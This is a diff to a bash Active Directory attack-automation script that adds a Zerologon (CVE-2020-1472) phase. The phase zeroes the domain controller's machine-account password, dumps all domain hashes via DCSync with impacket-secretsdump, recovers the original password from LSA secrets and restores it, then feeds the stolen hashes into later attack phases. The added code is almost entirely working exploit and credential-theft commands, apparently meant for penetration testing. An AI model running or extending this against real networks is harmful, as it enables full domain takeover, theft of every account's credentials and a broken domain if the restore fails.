@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.21.1"
+readonly VERSION="1.22.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1320,6 +1320,95 @@ phase_nopac_abuse() {
         ingest_dcsync_output "$out" "NoPAC CVE-2021-42278/42287"
     else
         warn "NoPAC did not produce DCSync hashes for $USER"
+    fi
+}
+
+# ===========================================================================
+#  ZEROLOGON  —  CVE-2020-1472 exploit WITH mandatory safe restore.
+#  DESTRUCTIVE: zeroes the DC machine-account password, so the secure channel is
+#  broken until we set it back. We only fire when (a) --abuse is set AND (b) the
+#  DC actually tests vulnerable, then immediately recover the original machine
+#  password (hex, from LSA secrets) and restore it. The restore is retried and,
+#  if it ever fails, the exact manual command is saved + screamed to the user.
+# ===========================================================================
+ZEROLOGON_DONE=0
+phase_zerologon_abuse() {
+    [[ "$ZEROLOGON_DONE" == "1" ]] && return
+    [[ "$DO_ABUSE" != "1" ]] && return                       # opt-in: it's destructive
+    [[ "$IS_DC_ADMIN" == "1" ]] && return                    # already own the DC
+    [[ -z "$DC_HOST" || -z "$DC_IP" || -z "$DOMAIN" ]] && return
+    have impacket-secretsdump || return
+    local xpl rst; xpl="$(external_tool CVE-2020-1472/cve-2020-1472-exploit.py)"
+    rst="$(external_tool CVE-2020-1472/restorepassword.py)"
+    [[ -z "$xpl" || -z "$rst" ]] && return
+    ZEROLOGON_DONE=1
+
+    section "ZEROLOGON ABUSE · CVE-2020-1472 (exploit + SAFE restore)"
+
+    # 1) Vulnerability check FIRST — never blind-exploit a (possibly patched) DC.
+    subsection "Zerologon vulnerability check"
+    local chk; chk=$($NXC smb "$DCT" -u '' -p '' -M zerologon 2>&1); echo "$chk" | tee -a "$LOGFILE"
+    if ! grep -qiE 'VULNERABLE|is vulnerable' <<<"$chk"; then
+        info "DC not reported vulnerable to Zerologon → skipping (nothing fired, DC untouched)"
+        return
+    fi
+    loot "DC tests VULNERABLE to Zerologon → exploiting, then restoring"
+    warn "DESTRUCTIVE step: zeroing the DC machine password now. Auto-restore follows — do NOT interrupt."
+
+    # 2) Exploit → DC machine-account password becomes empty.
+    subsection "Setting DC machine-account password to empty"
+    run "python3 cve-2020-1472-exploit.py $DC_HOST $DC_IP"
+    local xo; xo=$( python3 "$xpl" "$DC_HOST" "$DC_IP" 2>&1 ); echo "$xo" | tee -a "$LOGFILE"
+    if ! grep -qiE 'Exploit complete' <<<"$xo"; then
+        warn "Exploit did not confirm success ('Exploit complete!') — aborting; machine pw should be untouched"
+        return
+    fi
+    rb_record "Zerologon: DC '$DC_HOST' machine password zeroed" \
+              "echo 'If auto-restore failed, run: python3 $rst $DOMAIN/$DC_HOST\$@$DC_HOST -target-ip $DC_IP -hexpass <ORIG_HEX from $OUTDIR/zerologon_localsecrets.txt>'"
+
+    # 3) DCSync as the zeroed machine account → Administrator NT hash.
+    subsection "DCSync via empty machine-account password"
+    local d1="$OUTDIR/zerologon_dcsync.txt"
+    run "impacket-secretsdump -no-pass $DOMAIN/$DC_HOST\$@$DC_IP -just-dc"
+    impacket-secretsdump -no-pass "$DOMAIN/$DC_HOST\$@$DC_IP" -just-dc 2>&1 | tee -a "$LOGFILE" | tee "$d1"
+    local admin_nt; admin_nt=$(grep -iE '^administrator:' "$d1" | head -1 | cut -d: -f4)
+
+    # 4) Recover the ORIGINAL machine password (hex) needed by the restore.
+    local orig_hex="" d2="$OUTDIR/zerologon_localsecrets.txt"
+    if [[ -n "$admin_nt" ]]; then
+        subsection "Recovering original machine password (LSA secrets) for restore"
+        impacket-secretsdump -hashes ":$admin_nt" "$DOMAIN/Administrator@$DC_IP" 2>&1 | tee -a "$LOGFILE" | tee "$d2"
+        orig_hex=$(grep -oiP '\$MACHINE\.ACC:\s*plain_password_hex:\K[0-9a-fA-F]+' "$d2" | head -1)
+    fi
+
+    # 5) RESTORE — mandatory + retried. A zeroed DC breaks the whole domain.
+    if [[ -n "$orig_hex" ]]; then
+        subsection "Restoring DC machine-account password"
+        run "python3 restorepassword.py $DOMAIN/$DC_HOST\$@$DC_HOST -target-ip $DC_IP -hexpass <orig>"
+        local ro tries=0 ok=0
+        while (( tries++ < 3 )); do
+            ro=$( python3 "$rst" "$DOMAIN/$DC_HOST\$@$DC_HOST" -target-ip "$DC_IP" -hexpass "$orig_hex" 2>&1 ); echo "$ro" | tee -a "$LOGFILE"
+            grep -qiE 'Change password OK' <<<"$ro" && { ok=1; break; }
+            sleep 3
+        done
+        if [[ "$ok" == "1" ]]; then
+            loot "★ DC machine-account password RESTORED — secure channel healthy again"
+        else
+            err "RESTORE FAILED after 3 tries! The DC secure channel is BROKEN — restore it NOW:"
+            err "  python3 $rst '$DOMAIN/$DC_HOST\$@$DC_HOST' -target-ip $DC_IP -hexpass $orig_hex"
+            printf "python3 %q '%s/%s$@%s' -target-ip %s -hexpass %s\n" "$rst" "$DOMAIN" "$DC_HOST" "$DC_HOST" "$DC_IP" "$orig_hex" >"$OUTDIR/ZEROLOGON_RESTORE_COMMAND.txt"
+        fi
+    else
+        err "Could not recover the original machine password (no Administrator hash / no LSA hex)."
+        err "DC machine password is STILL EMPTY. Recover the hex and restore manually:"
+        err "  impacket-secretsdump -hashes :<admin_nt> $DOMAIN/Administrator@$DC_IP   # grep \$MACHINE.ACC plain_password_hex"
+        err "  python3 $rst '$DOMAIN/$DC_HOST\$@$DC_HOST' -target-ip $DC_IP -hexpass <hex>"
+    fi
+
+    # 6) Ingest the domain hashes (queues Administrator, marks us DC admin).
+    if grep -qE ':::' "$d1" 2>/dev/null; then
+        ingest_dcsync_output "$d1" "Zerologon CVE-2020-1472"
+        IS_DC_ADMIN=1
     fi
 }
 
@@ -4849,6 +4938,7 @@ assess_current_credential() {
     phase_attack_surface; jitter
     phase_cve_checks;   jitter
     phase_nopac_abuse;  jitter
+    phase_zerologon_abuse; jitter
     phase_delegation_abuse; jitter
     phase_precreated_computers; jitter
     phase_user_variants; jitter
